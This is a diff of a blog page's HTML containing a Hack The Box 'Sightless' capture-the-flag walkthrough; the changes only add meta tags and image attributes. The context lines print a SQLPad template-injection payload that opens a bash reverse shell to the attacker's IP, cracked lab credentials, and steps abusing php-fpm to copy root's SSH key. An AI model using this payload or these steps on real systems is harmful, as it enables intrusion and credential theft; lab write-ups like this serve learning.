@@ -3,6 +3,18 @@
 <head>
     <meta charset="utf-8">
     <title>HTB: Sightless | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the Hack The Box machine Sightless, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2024-10-13-Sightless(HTB).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="HTB: Sightless">
+    <meta property="og:description" content="Walkthrough of the Hack The Box machine Sightless, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2024-10-13-Sightless(HTB).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2024-10-13">
+    <!-- /site-meta -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="../assets/css/syntax.css">
     <style>
@@ -312,21 +324,21 @@
 
         <p>http://sqlpad.sightless.htb/</p>
 
-        <img alt="Screenshot 2" height="568" src="../img/posts/2024-10-13-Sightless(HTB)/02-84cae0d756.png" style="aspect-ratio:1891/568;" width="1891"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 2" height="568" src="../img/posts/2024-10-13-Sightless(HTB)/02-84cae0d756.png" style="aspect-ratio:1891/568;" width="1891"/>
 
         <p>The site seems to allow us to execute sql querries if we connect to a database. But we do not have any creds so we cannot connect to anything.</p>
 
-        <img alt="Screenshot 3" height="872" src="../img/posts/2024-10-13-Sightless(HTB)/03-62f59f3e29.png" style="aspect-ratio:2550/872;" width="2550"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 3" height="872" src="../img/posts/2024-10-13-Sightless(HTB)/03-62f59f3e29.png" style="aspect-ratio:2550/872;" width="2550"/>
 
         <p>Using apache pinot we can get a callback to our machine by entering our IP but we cant really exploit this further.</p>
 
-        <img alt="Screenshot 4" height="676" src="../img/posts/2024-10-13-Sightless(HTB)/04-b36538199e.png" style="aspect-ratio:550/676;" width="550"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 4" height="676" src="../img/posts/2024-10-13-Sightless(HTB)/04-b36538199e.png" style="aspect-ratio:550/676;" width="550"/>
 
-        <img alt="Screenshot 5" height="154" src="../img/posts/2024-10-13-Sightless(HTB)/05-b6e82490c1.png" style="aspect-ratio:595/154;" width="595"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 5" height="154" src="../img/posts/2024-10-13-Sightless(HTB)/05-b6e82490c1.png" style="aspect-ratio:595/154;" width="595"/>
 
         <p>In the about section of sqlpad we can find the version</p>
 
-        <img alt="Screenshot 6" height="362" src="../img/posts/2024-10-13-Sightless(HTB)/06-b409917261.png" style="aspect-ratio:652/362;" width="652"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 6" height="362" src="../img/posts/2024-10-13-Sightless(HTB)/06-b409917261.png" style="aspect-ratio:652/362;" width="652"/>
 
         <p>With a lot of googling i found a POC we can use to exploit this.</p>
 
@@ -336,15 +348,15 @@
 
         <pre class="terminal"><code>{{ process.mainModule.require('child_process').exec('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.4/443 0&gt;&amp;1"') }}</code></pre>
 
-        <img alt="Screenshot 7" height="1285" src="../img/posts/2024-10-13-Sightless(HTB)/07-1c2d36b217.png" style="aspect-ratio:561/1285;" width="561"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 7" height="1285" src="../img/posts/2024-10-13-Sightless(HTB)/07-1c2d36b217.png" style="aspect-ratio:561/1285;" width="561"/>
 
-        <img alt="Screenshot 8" height="193" src="../img/posts/2024-10-13-Sightless(HTB)/08-116586ea25.png" style="aspect-ratio:625/193;" width="625"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 8" height="193" src="../img/posts/2024-10-13-Sightless(HTB)/08-116586ea25.png" style="aspect-ratio:625/193;" width="625"/>
 
         <p>Looks like we are inside of a docker container.</p>
 
         <p>IN the sqlpad directory there is a sql lite file. I was able to mount it to sqlpad and access the user hashes but its just for sqlpad and doesnt look useful. </p>
 
-        <img alt="Screenshot 9" height="1006" src="../img/posts/2024-10-13-Sightless(HTB)/09-47e329322b.png" style="aspect-ratio:660/1006;" width="660"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 9" height="1006" src="../img/posts/2024-10-13-Sightless(HTB)/09-47e329322b.png" style="aspect-ratio:660/1006;" width="660"/>
 
         <p>$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC</p>
 
@@ -366,19 +378,19 @@
 
         <p>Cracked the hash</p>
 
-        <img alt="Screenshot 10" height="249" src="../img/posts/2024-10-13-Sightless(HTB)/10-bd699c1221.png" style="aspect-ratio:799/249;" width="799"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 10" height="249" src="../img/posts/2024-10-13-Sightless(HTB)/10-bd699c1221.png" style="aspect-ratio:799/249;" width="799"/>
 
         <p>We can now ssh in and get the user flag</p>
 
         <p>michael:insaneclownposse</p>
 
-        <img alt="Screenshot 11" height="227" src="../img/posts/2024-10-13-Sightless(HTB)/11-8685c51075.png" style="aspect-ratio:708/227;" width="708"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 11" height="227" src="../img/posts/2024-10-13-Sightless(HTB)/11-8685c51075.png" style="aspect-ratio:708/227;" width="708"/>
 
         <h1 style="color:#5eead4;">Shell as Root</h1>
 
         <p>Root took me a very long time and I had to get hints. I was familiar with this exploit but never used it before. During linpeas we can see chrome is open with remote debugging port but the port was set to 0 so I didnt think we could use it. Looks like we were supposed to forward random open ports on the machine and hope one happened to be chrome. I was able to portforward 8080 and get to the login page which has authenticated RCE but I had no creds to login. We also had to add localhost to our /etc/hosts file. 127.0.0.1 admin.sightless.htb</p>
 
-        <img alt="Screenshot 12" height="924" src="../img/posts/2024-10-13-Sightless(HTB)/12-fd30d96595.png" style="aspect-ratio:1571/924;" width="1571"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 12" height="924" src="../img/posts/2024-10-13-Sightless(HTB)/12-fd30d96595.png" style="aspect-ratio:1571/924;" width="1571"/>
 
         <p>Once we got the right port we can inspect traffic from the session and find the cleartext credentials to login.</p>
 
@@ -386,37 +398,37 @@
 
         <pre class="terminal"><code>ssh -L 42721:localhost:42721 michael@10.10.11.32</code></pre>
 
-        <img alt="Screenshot 13" height="501" src="../img/posts/2024-10-13-Sightless(HTB)/13-b1b0d0cc1c.png" style="aspect-ratio:898/501;" width="898"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 13" height="501" src="../img/posts/2024-10-13-Sightless(HTB)/13-b1b0d0cc1c.png" style="aspect-ratio:898/501;" width="898"/>
 
         <p>Wait for michael to login and we get creds</p>
 
-        <img alt="Screenshot 14" height="514" src="../img/posts/2024-10-13-Sightless(HTB)/14-4ebf6ebd23.png" style="aspect-ratio:2554/514;" width="2554"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 14" height="514" src="../img/posts/2024-10-13-Sightless(HTB)/14-4ebf6ebd23.png" style="aspect-ratio:2554/514;" width="2554"/>
 
         <p>admin:ForlorfroxAdmin</p>
 
         <p>We can use php-fpm to copy the id_rsa from root to /tmp. Create a new version as shown below.</p>
 
-        <img alt="Screenshot 15" height="635" src="../img/posts/2024-10-13-Sightless(HTB)/15-92af75c11e.png" style="aspect-ratio:2519/635;" width="2519"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 15" height="635" src="../img/posts/2024-10-13-Sightless(HTB)/15-92af75c11e.png" style="aspect-ratio:2519/635;" width="2519"/>
 
         <p>Then start/stop fpm to execute the command</p>
 
-        <img alt="Screenshot 16" height="743" src="../img/posts/2024-10-13-Sightless(HTB)/16-615b2e1084.png" style="aspect-ratio:1723/743;" width="1723"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 16" height="743" src="../img/posts/2024-10-13-Sightless(HTB)/16-615b2e1084.png" style="aspect-ratio:1723/743;" width="1723"/>
 
         <p>This took about an hour to show up and I had to disable/re-enable php over and over and over</p>
 
-        <img alt="Screenshot 17" height="206" src="../img/posts/2024-10-13-Sightless(HTB)/17-ab33876b4e.png" style="aspect-ratio:1249/206;" width="1249"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 17" height="206" src="../img/posts/2024-10-13-Sightless(HTB)/17-ab33876b4e.png" style="aspect-ratio:1249/206;" width="1249"/>
 
-        <img alt="Screenshot 18" height="39" src="../img/posts/2024-10-13-Sightless(HTB)/18-834f4c821c.png" style="aspect-ratio:280/39;" width="280"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 18" height="39" src="../img/posts/2024-10-13-Sightless(HTB)/18-834f4c821c.png" style="aspect-ratio:280/39;" width="280"/>
 
         <p>And to top things off we cannot read the file as its still owned by root. So did the same steps above with chmod 777 /tmp/id_rsa as the command and waited another hour to be able to read the file.</p>
 
-        <img alt="Screenshot 19" height="196" src="../img/posts/2024-10-13-Sightless(HTB)/19-4d238a1054.png" style="aspect-ratio:463/196;" width="463"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 19" height="196" src="../img/posts/2024-10-13-Sightless(HTB)/19-4d238a1054.png" style="aspect-ratio:463/196;" width="463"/>
 
-        <img alt="Screenshot 20" height="180" src="../img/posts/2024-10-13-Sightless(HTB)/20-412db616e7.png" style="aspect-ratio:430/180;" width="430"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 20" height="180" src="../img/posts/2024-10-13-Sightless(HTB)/20-412db616e7.png" style="aspect-ratio:430/180;" width="430"/>
 
         <p>By far one of the worst machines ive done and I have no idea how it has an easy rating.</p>
 
-        <img alt="Screenshot 21" height="631" src="../img/posts/2024-10-13-Sightless(HTB)/21-deb4cff700.png" style="aspect-ratio:687/631;" width="687"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 21" height="631" src="../img/posts/2024-10-13-Sightless(HTB)/21-deb4cff700.png" style="aspect-ratio:687/631;" width="687"/>
     </article>
 
 <script>
